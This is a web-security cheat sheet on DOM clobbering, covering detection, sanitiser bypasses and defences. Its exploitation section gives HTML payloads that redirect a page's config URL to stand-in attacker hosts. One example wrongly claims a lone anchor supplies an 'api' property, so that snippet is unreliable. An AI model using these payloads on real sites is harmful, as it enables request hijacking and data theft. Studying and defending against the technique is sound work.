# DOM Clobbering

> Attacker-controlled HTML in the page overrides a JS global (`window.foo`) or app property (`config.url`) because the DOM exposes `id` and `name` attributes as named properties of `document` / `window`. Authorized testing only. Map: CWE-1321 (related to prototype pollution), HTML Living Standard §named-access.

## TL;DR
- Browsers add elements with `id="X"` or `name="X"` to `document.X` and (for many elements) `window.X`. Multiple elements with the same `id`/`name` form an `HTMLCollection`. `<form>` element exposes its `name`-attributed children as properties of itself.
- If JS reads a config-ish global without a `typeof` guard — `if (!window.config) window.config = {url: '/api'};` — attacker who injects `<a id=config href="//evil/">` shifts the read.
- Pairs naturally with markdown / HTML-bleach sites where `<form>` / `<a>` / `<img>` are allowed but `<script>` isn't.
- Defence: avoid global-property access patterns; use `Object.create(null)`-style namespaces; sanitise allowed HTML attributes including `id` and `name`.

## Detection / Discovery
- Inspect the client-side JS for `window.X`, `document.X`, or hoisted `var X` reads where `X` is also a plausible HTML id.
- Source-side searches: `if (!window.` , `window.config`, `document.querySelector(name)` patterns.
- Test: inject `<a id=foo>` and check whether `document.foo` resolves in a browser console on a clobber-test page.

## Exploitation

### Override a config URL
```html
<!-- Page JS does: const cfg = window.cfg || { api: '/api' }; fetch(cfg.api + '/me') -->
<!-- Sanitizer allows <a> but strips <script> -->
<a id=cfg href="//attacker.tld/"></a>
<!-- Now window.cfg === <a id=cfg>; window.cfg.api === window.cfg.href === "//attacker.tld/" -->
```

### Multi-attribute clobber on `<form>`
```html
<form id=cfg>
  <input name=api value="//attacker.tld/api">
</form>
<!-- window.cfg.api === <input name=api>; .value === "//attacker.tld/api" via toString chain on some types -->
```

### `__proto__` clobber via DOM (joins with prototype-pollution)
```html
<a id=__proto__ href=javascript:alert(1)>
```
If a script does `for (const k in obj) if (obj.__proto__ === something) …`, the comparison may be against an HTMLAnchorElement now.

### `currentScript` redirection
```html
<img name=currentScript src=evil>
<!-- document.currentScript becomes the <img> for the next eval block; relative URL resolution shifts -->
```
Rare in modern apps but documented in HTML spec.

## Bypasses (against weak sanitisers)
- Sanitiser strips `<script>` but allows `<form>`, `<a>`, `<input>`, `<img>` with arbitrary `name` / `id` → clobbering only.
- Markdown renderers (CommonMark + raw-html allowance) regularly miss this class.
- DOMPurify ships a config for "no-named-element-properties" but defaults allow `id` and `name` — verify your config.

## Defence / Remediation
- **Strict CSP**: `script-src 'self' 'nonce-…'` doesn't directly prevent DOM clobbering, but blocking inline event handlers + reflected-XSS shrinks the chain.
- **Avoid global-property defaults**:
  - Don't write `window.X = window.X || {…}`.
  - Use module-scoped const objects or `Object.create(null)`-rooted namespaces.
- **`typeof` guard** when reading a possibly-clobbered global:
  - `typeof window.config === 'object' && !(config instanceof Element)`.
- **Sanitise `id` / `name` attributes** in any user-controllable HTML. DOMPurify: `ALLOWED_ATTR` minus `id`/`name`; or `SANITIZE_DOM: true` (default in recent versions, but verify version).
- **Trusted Types** (Chromium) for any DOM sink — combined with the above, raises the cost considerably.
- CWE-1321 — same family as prototype pollution; OWASP Top 10 maps to A03 Injection.

## Sources
- HTML Living Standard — Named access on the Window object: https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object
- HTML Living Standard — Named characteristics on `document`: https://html.spec.whatwg.org/multipage/dom.html#named-access-on-document
- Gareth Heyes / PortSwigger — DOM Clobbering: https://portswigger.net/web-security/dom-based/dom-clobbering
- DOMPurify: https://github.com/cure53/DOMPurify
- DOM Clobbering Wiki (Khodayari): https://domclob.xyz/domc_wiki/
- "It's (DOM) Clobbering Time" (S&P 2023, Khodayari et al.): https://trouge.net/papers/domclob_sp23.pdf
- CWE-1321 (closely related): https://cwe.mitre.org/data/definitions/1321.html
